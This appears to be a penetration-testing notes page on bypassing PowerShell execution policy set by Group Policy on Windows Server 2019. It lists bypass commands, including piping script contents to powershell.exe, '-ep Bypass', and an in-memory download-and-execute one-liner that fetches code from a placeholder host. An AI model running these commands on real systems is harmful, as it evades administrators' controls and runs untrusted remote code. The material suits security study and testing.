# Restricted Mode

## Description

PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts.

On a Windows computer you can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policies for computers and users.


Microsoft stress in their documentation that Execution Policy / Restricted Mode is a safety feature and not a security feature.

## Scenario

This page covers a scenario on a fully updated Windows 2019 Server with a Group Policy Object applied that enforces PowerShell to restrict running all scripts on the system.

As a result of this attempting to execute a basic script on the system produces the following result:


## Identify current policy

```bash
Get-ExecutionPolicy -List | Format-Table -AutoSize
```

## Bypasses

There are many ways to bypass the restriction. Most methods are based on reading the contents of the script and piping to the PowerShell.exe process in some way. Below is shown a simple bypass method.

```bash
Get-Content .\Script.ps1 | powershell.exe -nop
```


The following methods have also proven to be successful.

```bash
# Read contents and pipe to Powershell.exe (Writes to disk)
Get-Content .\Script.ps1 | powershell.exe -nop
Type .\Script.ps1 | powershell.exe -nop

# Download and execute (In Memory)
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<IP>/<File>')"

# Potential simple bypass (Writes to disk)
powershell -ep Bypass .\Script.ps1
powershell -ep Unrestricted .\Script.ps1

# Bypass process scope
Set-ExecutionPolicy Bypass -Scope Process
#Bypass current user scope
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```

## References
- [Netspi](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
- [Null Byte](https://null-byte.wonderhowto.com/how-to/bypass-powershell-execution-policy-pwn-windows-0323455/)
- [Microsoft](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1)

